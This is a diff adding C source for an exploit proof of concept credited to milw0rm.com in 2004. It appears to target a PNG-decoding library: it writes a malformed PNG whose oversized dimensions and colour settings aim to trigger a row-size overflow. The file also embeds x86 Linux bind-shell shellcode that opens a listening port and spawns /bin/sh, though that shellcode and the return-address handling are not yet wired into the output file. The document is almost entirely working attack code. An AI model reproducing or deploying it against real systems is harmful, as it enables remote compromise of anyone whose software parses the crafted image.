@@ -1,0 +1,167 @@
+#include <stdio.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <fcntl.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <zlib.h>
+
+#define OUTFILE "britnay_spares_pr0n.png"
+#define BS 0x1000
+#define ALIGN 0
+
+#define die(x) do{ perror((x)); exit(EXIT_FAILURE);}while(0)
+
+/*
+ * a chunk looks like:
+ * [ 4 byte len ]   - just the length of data
+ * [ 4 byte id  ]   - identifies chunk data type
+ * [ 0+ data    ]   - 
+ * [ 4 byte crc ]   - covers the id and data
+ */
+
+/* identifies a file as a png */
+#define MAJIC_LEN sizeof(png_majic)
+u_char png_majic[] = { 0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a };
+
+/* png id fields */
+#define ID_LEN sizeof(png_ihdr_id)
+u_char png_ihdr_id[] = { 73, 72, 68, 82 };
+u_char png_idat_id[] = { 73, 68, 65, 84 };
+u_char png_iend_id[] = { 73, 69, 78, 68 };
+
+
+/*
+ * the iHDR chunk.  image information.
+ */
+#define IHDR_LEN sizeof(png_ihdr)
+struct _png_ihdr {
+    uint32_t    len,
+                id,
+                width,
+                height;
+    uint8_t     bit_depth,
+                color_type,
+                compress_meth,
+                filter_meth,
+                interlace_meth;
+    uint32_t    crc;
+} __attribute__((packed));
+typedef struct _png_ihdr png_ihdr;
+
+
+/*
+ * the iDAT chunk. the compressed data of image.
+ */
+#define IDAT_LEN sizeof(png_idat)
+#define IDAT_DATA_SZ 512
+struct _png_idat {
+    uint32_t    len,
+                id;
+    u_char      data[IDAT_DATA_SZ];
+    uint32_t    crc;
+} __attribute__((packed));
+typedef struct _png_idat png_idat;
+
+
+/*
+ * the iEND chunk. contains no data.
+ */
+#define IEND_LEN sizeof(png_iend)
+struct _png_iend {
+    uint32_t    len,
+                id,
+                crc;
+} __attribute__((packed));
+typedef struct _png_iend png_iend;
+
+
+/* call them shell code */
+#define SHELL_LEN strlen(sc)
+char sc[] =
+    "\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6"
+    "\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50"
+    "\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a"
+    "\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31"
+    "\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0"
+    "\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80"
+    "\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+    "\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+
+
+int main(int argc, char **argv)
+{
+    int fd = 0, len = 0;
+    char    *filename = OUTFILE;
+    u_char  buf[BS] = { 0, };
+    u_long  retaddr = 0;
+    png_ihdr    ihdr;
+    png_idat    idat;
+    png_iend    iend;
+
+#if 0
+    if(argc < 2){
+        fprintf(stderr, "Usage: %s < retaddr > [ outfile ]\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+    if(argc > 2)
+        filename = argv[2];
+    sscanf(argv[1], "%lx", &retaddr);
+#endif
+
+#define PNG_USER_WIDTH_MAX 1000000L /* 0xf4240 */
+    /*
+     * setup png headers
+     */
+    size_t  a,b;
+    ihdr.len = htonl(0xd);
+    memcpy(&ihdr.id, png_ihdr_id, ID_LEN);
+    /*
+     * need to play with width and height, and also with color_type. depending
+     * on color_type value, rowbytes can be manipulated
+     */
+    a = ihdr.width = htonl(0x8000);
+    b = ihdr.height = htonl(0x10000);
+    ihdr.bit_depth = 16;
+    ihdr.color_type = 4;
+    ihdr.compress_meth = 0x0;
+    ihdr.filter_meth = 0x0;
+    ihdr.interlace_meth = 0x0;
+    ihdr.crc = htonl(crc32(0, (u_char *)&ihdr.id, 17));
+
+    iend.len = 0x0;
+    memcpy(&iend.id, png_iend_id, ID_LEN);
+    iend.crc = htonl(crc32(0, (u_char *)&iend.id, 4));
+
+    idat.len = htonl(IDAT_DATA_SZ);
+    memcpy(&idat.id, png_idat_id, ID_LEN);
+    memset(idat.data, 'A', IDAT_DATA_SZ);
+    idat.crc = htonl(crc32(0, (u_char *)&idat.id, IDAT_DATA_SZ+4));
+    
+    /* 
+     * create buffer:
+     * png id - png ihdr - png idat - png iend
+     */
+    memcpy(buf, png_majic, MAJIC_LEN);
+    len += MAJIC_LEN;
+    memcpy(buf+len, &ihdr, IHDR_LEN);
+    len += IHDR_LEN;
+    memcpy(buf+len, &idat, IDAT_LEN);
+    len += IDAT_LEN;
+    memcpy(buf+len, &iend, IEND_LEN);
+    len += IEND_LEN;
+
+    /* create the file */
+    if( (fd = open(filename, O_WRONLY|O_CREAT, 0666)) < 0)
+        die("open");
+    if(write(fd, buf, len) != len)
+        die("write");
+    close(fd);
+    
+    return 0;
+}
+
+// milw0rm.com [2004-10-26]
